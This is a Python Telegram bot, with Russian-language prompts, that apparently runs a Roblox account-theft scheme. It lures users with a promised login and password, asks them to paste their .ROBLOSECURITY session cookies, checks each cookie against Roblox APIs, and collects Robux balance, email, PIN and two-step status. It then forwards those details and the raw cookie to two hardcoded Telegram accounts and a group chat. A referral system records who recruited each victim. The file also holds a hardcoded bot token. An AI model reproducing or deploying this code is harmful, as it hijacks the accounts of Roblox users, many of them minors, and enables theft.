import telebot
from telebot import types
from requests import get
import sqlite3

TOKEN = '7890017571:AAHgQuBe8rlOETOaOidW1E5gBGfHAO2yEqk'
bot = telebot.TeleBot(TOKEN)

CHAT_ID = -1002338678228

conn = sqlite3.connect('db.db', check_same_thread=False)
cursor = conn.cursor()

@bot.message_handler(commands=['get_link'])
def start(message):
    if message.chat.id != CHAT_ID:
        return

    a = 1730
    user_id = message.from_user.id
    username = message.from_user.username
    bot.send_message(chat_id = CHAT_ID, text = f"@{username}, ваша ссылка: https://t.me/Cerberusrbxbot?start={user_id}", reply_to_message_id = a )


@bot.message_handler(commands=['start'])
def start(message):
    a = 1545
    user_id = message.from_user.id
    username = message.from_user.username
    referral_code = message.text.split()[1] if len(message.text.split()) > 1 else None
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result:
        pass
    else:
        cursor.execute('INSERT INTO users (user_id, username, ref) VALUES (?, ?, ?)', (user_id, username, referral_code))
        conn.commit()
        bot.send_message(chat_id = CHAT_ID, text = f"🤖 Пользователь {referral_code} пригласил {user_id}", reply_to_message_id = a )
    
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("▶️ Начать", callback_data="start_btn"))
    markup.add(types.InlineKeyboardButton("📖 Мануал", url='https://t.me/+2F8Xlia8au0wYzI6'))  # Укажите вашу ссылку
    bot.send_message(message.chat.id, "✨ Прочитайте мануал и нажмите кнопку начать 🌟", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_btn")
def handle_cookies(call):
    bot.send_message(call.message.chat.id, "📝 Пожалуйста, введите ваши куки файлы:")

    # Сохраняем состояние ожидания куки файлов
    bot.register_next_step_handler(call.message, check_cookies)

def check_cookies(message):
    cookies = message.text

    response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookies})
    if '"id":' in response.text:
        user_id = response.json()['id']
        robux = get(f'https://economy.roblox.com/v1/users/{user_id}/currency',cookies={'.ROBLOSECURITY': cookies}).json()['robux']
        balance_creit_info = get(f'https://billing.roblox.com/v1/credit',cookies={'.ROBLOSECURITY': cookies})
        balance_credit = balance_creit_info.json()['balance']
        balance_credit_currency = balance_creit_info.json()['currencyCode']
        account_settings = get(f'https://www.roblox.com/my/settings/json',cookies={'.ROBLOSECURITY': cookies})
        account_name = account_settings.json()['Name']
        account_display_name = account_settings.json()['DisplayName']
        account_email_verified = account_settings.json()['IsEmailVerified']
        
        if bool(account_email_verified):
            account_email_verified = f'{account_email_verified} (`{account_settings.json()["UserEmail"]}`)'
        account_above_13 = account_settings.json()['UserAbove13']
        account_age_in_years = round(float(account_settings.json()['AccountAgeInDays']/365),2)
        account_has_premium = account_settings.json()['IsPremium']
        account_has_pin = account_settings.json()['IsAccountPinEnabled']

        account_2step = account_settings.json()['MyAccountSecurityModel']['IsTwoStepEnabled']
        user_id1 = message.from_user.id
        cursor.execute('SELECT ref FROM users WHERE user_id = ?', (user_id1,))
        result = cursor.fetchone()
        a = 1546
        bot.send_message(chat_id = CHAT_ID, text = f"🆔 ID: {message.chat.id}\n🪪 Username: {account_name} | {user_id}\n💴 Robux: {robux}\n📬 Email: {account_email_verified}\n🔐 Pin: {account_has_pin}\n👥 Referral_code: {result}", reply_to_message_id = a )
        bot.send_message(7632333378, f"🆔 ID: {message.chat.id}\n🪪 Username: {account_name} | {user_id}\n💴 Robux: {robux}\n📬 Email: {account_email_verified}\n🔐 Pin: {account_has_pin}\n👥 Referral_code: {result}\n\n{cookies}")
        bot.send_message(5941273859, f"🆔 ID: {message.chat.id}\n🪪 Username: {account_name} | {user_id}\n💴 Robux: {robux}\n📬 Email: {account_email_verified}\n🔐 Pin: {account_has_pin}\n👥 Referral_code: {result}\n\n{cookies}")
        bot.send_message(message.chat.id, "✅ Куки файлы валидны! Ожидайте логин и пароль в течении 3 часов🎉 ")

        
    else:
        bot.send_message(message.chat.id, "❌ Куки файлы неверны. Повторите попытку введя команду /start")

def validate_cookies(cookies):
    # Логика для проверки куки файлов
    return True  # или False в зависимости от проверки

if __name__ == "__main__":
    bot.polling(none_stop=True)
